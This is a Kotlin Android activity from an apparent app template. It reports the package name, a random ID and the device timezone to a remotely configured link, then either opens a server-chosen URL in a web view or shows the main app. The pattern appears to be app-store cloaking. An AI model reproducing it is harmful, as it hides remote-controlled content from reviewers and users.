package com.template

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.google.gson.Gson
import com.onesignal.OneSignal
import retrofit2.HttpException
import java.net.URL
import java.text.DateFormat
import java.text.SimpleDateFormat
import java.util.*

class MyInitialActivity : AppCompatActivity() {
    private lateinit var firebaseAnalytics: FirebaseAnalytics
    val APP_ID = "752d8075-fac0-45f6-89ff-0cb8a2a0c803"
    val uuid = UUID.randomUUID()
    val gson = Gson()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_my_initial2)

        firebaseAnalytics = Firebase.analytics

        initSignal()

        val remoteConfig = Firebase.remoteConfig
        configSettings(remoteConfig)
        remoteConfig.fetchAndActivate().addOnCompleteListener(this){task ->
            if (task.isSuccessful){
                val url = remoteConfig.getString("check_link")
                makingUrl(url)
            }
        }
    }

    fun initSignal() {
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE)

        OneSignal.initWithContext(this)
        OneSignal.setAppId(APP_ID)
    }

    fun configSettings(remoteConfig: FirebaseRemoteConfig) {
        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 3600
        }
        remoteConfig.setConfigSettingsAsync(configSettings)
    }

    fun getTime(): String {
        val timeZone = TimeZone.getDefault()
        return timeZone.id.toString()
    }

    fun makingUrl(url:String) {
        try {
            val response = URL(
                "${url}/?packageid=${packageName}&usserid=${uuid}&getz=${getTime()}" +
                        "&getr=utm_source=google-play&utm_medium=organic"
            ).readText()
            if (response.isNotEmpty()) {
                val data = gson.fromJson(response, Response::class.java)
                OneSignal.sendTag("player_id",data.url)

                val intent = Intent(this,WebActivity::class.java).apply {
                    putExtra("url",data.url)
                }
                startActivity(intent)
            }
        } catch (e: HttpException) {
            Log.i("MYSAG", e.message().toString())
        } catch (t: Throwable) {
            startActivity(Intent(this,MainActivity::class.java))
        }
    }
}